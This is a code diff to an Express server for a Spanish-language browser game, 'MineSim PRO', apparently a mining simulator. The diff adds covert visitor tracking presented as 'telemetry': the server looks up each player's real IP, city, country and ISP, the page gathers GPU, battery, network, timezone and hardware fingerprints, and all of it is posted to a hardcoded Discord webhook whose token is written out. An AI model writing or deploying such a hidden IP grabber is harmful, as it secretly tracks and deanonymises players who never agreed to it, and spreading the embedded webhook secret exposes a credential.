@@ -5,16 +5,17 @@ const PORT = process.env.PORT || 3000;
 app.set('trust proxy', true);
 app.use(express.json());
 
-// Consulta de IP y Geolocalización integrada
+// PEGA AQUÍ LA URL DE TU WEBHOOK DE DISCORD
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1543161075820793916/e5CYvM8GzZeNSFGUW_xYjxa9xbQDX6XgPpjGWrqUU1il2hy1ddb6h_TPT5MATQY3T4Yi";
+
 app.post('/api/telemetry', async (req, res) => {
     let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip;
     let userIp = rawIp ? rawIp.split(',')[0].trim() : 'IP no detectada';
     
-    const clientData = req.body || {};
+    const d = req.body || {};
     let country = 'Desconocido', city = 'Desconocida', isp = 'Desconocido';
 
     try {
-        // Consulta HTTPS con headers de User-Agent requeridos por ip-api
         const response = await fetch(`http://ip-api.com/json/${userIp}?fields=country,city,isp,status`, {
             headers: { 'User-Agent': 'Mozilla/5.0' }
         });
@@ -26,21 +27,45 @@ app.post('/api/telemetry', async (req, res) => {
         }
     } catch (e) {}
 
+    // 1. Imprimir en los logs de Render
     console.log(`\n========================================`);
     console.log(`🎯 [INFORME COMPLETO DE JUGADOR]`);
     console.log(`📍 IP Real: ${userIp}`);
     console.log(`🌎 Ubicación: ${city}, ${country}`);
-    console.log(`📡 Proveedor (ISP): ${isp}`);
-    console.log(`💻 Sistema / Navegador: ${clientData.userAgent || 'N/A'}`);
-    console.log(`🖥️ Resolución: ${clientData.screen || 'N/A'}`);
-    console.log(`🧠 Hardware: ${clientData.cores || 'N/A'} Núcleos | ~${clientData.ram || 'N/A'}GB RAM`);
-    console.log(`🌐 Idioma: ${clientData.language || 'N/A'}`);
+    console.log(`📡 ISP: ${isp}`);
     console.log(`========================================\n`);
+
+    // 2. Enviar reporte directo a Discord (Embed elegante)
+    if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.startsWith('http')) {
+        const embed = {
+            title: "🎮 ¡Nuevo Jugador Conectado!",
+            color: 3828984, // Azul
+            fields: [
+                { name: "📍 IP Real", value: `\`${userIp}\``, inline: true },
+                { name: "🌎 Ubicación", value: `${city}, ${country}`, inline: true },
+                { name: "📡 Proveedor (ISP)", value: isp, inline: false },
+                { name: "💻 Sistema / Navegador", value: `\`${d.userAgent || 'N/A'}\`` },
+                { name: "🖥️ Pantalla", value: d.screen || 'N/A', inline: true },
+                { name: "🧠 Hardware", value: `${d.cores || 'N/A'} Cores | ~${d.ram || 'N/A'}GB RAM`, inline: true },
+                { name: "🎮 GPU", value: d.gpu || 'N/A', inline: false },
+                { name: "🔋 Batería / Red", value: `${d.battery || 'N/A'} | ${d.connection || 'N/A'}`, inline: true },
+                { name: "🕒 Zona Horaria", value: `${d.timezone || 'N/A'} (${d.language || 'N/A'})`, inline: true }
+            ],
+            footer: { text: "MineSim Telemetry System" },
+            timestamp: new Date().toISOString()
+        };
+
+        fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ embeds: [embed] })
+        }).catch(err => console.error("Error al enviar a Discord:", err));
+    }
 
     res.sendStatus(200);
 });
 
-// Simulador de Minería Serio
+// Simulador de Minería 2D
 app.get('/', (req, res) => {
     res.send(`<!DOCTYPE html>
 <html lang="es">
@@ -52,7 +77,6 @@ app.get('/', (req, res) => {
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; user-select: none; }
         body { background: #0a0a0c; color: #fff; overflow: hidden; }
         canvas { display: block; background: #0f172a; }
-        
         #menu { position: absolute; width: 100%; height: 100%; background: #09090b; display: flex; justify-content: center; align-items: center; z-index: 20; }
         .panel { background: #18181b; padding: 35px; border-radius: 12px; border: 1px solid #27272a; text-align: center; width: 350px; box-shadow: 0 20px 40px rgba(0,0,0,0.8); }
         h1 { color: #38bdf8; font-size: 1.8rem; margin-bottom: 5px; font-weight: 800; }
@@ -60,18 +84,16 @@ app.get('/', (req, res) => {
         input { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #3f3f46; background: #09090b; color: #fff; text-align: center; margin-bottom: 15px; outline: none; }
         button { width: 100%; padding: 12px; border-radius: 6px; border: none; background: #0284c7; color: #fff; font-weight: bold; cursor: pointer; transition: 0.2s; }
         button:hover { background: #0369a1; }
-
         #ui { position: absolute; top: 15px; left: 15px; display: flex; gap: 12px; pointer-events: none; z-index: 10; }
         .stat-box { background: rgba(9, 9, 11, 0.9); padding: 8px 14px; border-radius: 6px; border: 1px solid #27272a; font-size: 0.8rem; }
         .stat-value { font-size: 1rem; font-weight: bold; color: #38bdf8; }
     </style>
 </head>
 <body>
-
     <div id="menu">
         <div class="panel">
             <h1>MINESIM PRO</h1>
-            <p>Simulador de Minería Profunda v3.0</p>
+            <p>Simulador de Minería Profunda v3.5</p>
             <input type="text" id="miner-name" value="Minero_01" placeholder="Nombre">
             <button onclick="startSim()">INICIAR SIMULACIÓN</button>
         </div>
@@ -85,13 +107,39 @@ app.get('/', (req, res) => {
     <canvas id="cv"></canvas>
 
     <script>
-    function sendTelemetry() {
+    function getGPU() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        } catch (e) {
+            return 'No detectada';
+        }
+    }
+
+    async function sendTelemetry() {
+        let batteryInfo = 'N/A';
+        if (navigator.getBattery) {
+            try {
+                const b = await navigator.getBattery();
+                batteryInfo = \`\${Math.round(b.level * 100)}%\` + (b.charging ? ' (Cargando)' : ' (Batería)');
+            } catch(e){}
+        }
+
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        const netType = conn ? (conn.effectiveType || conn.type || 'N/A') : 'N/A';
+
         const payload = {
             userAgent: navigator.userAgent,
             language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             screen: \`\${screen.width}x\${screen.height}\`,
             cores: navigator.hardwareConcurrency || 'N/A',
-            ram: navigator.deviceMemory || 'N/A'
+            ram: navigator.deviceMemory || 'N/A',
+            gpu: getGPU(),
+            battery: batteryInfo,
+            connection: netType
         };
 
         fetch('/api/telemetry', {
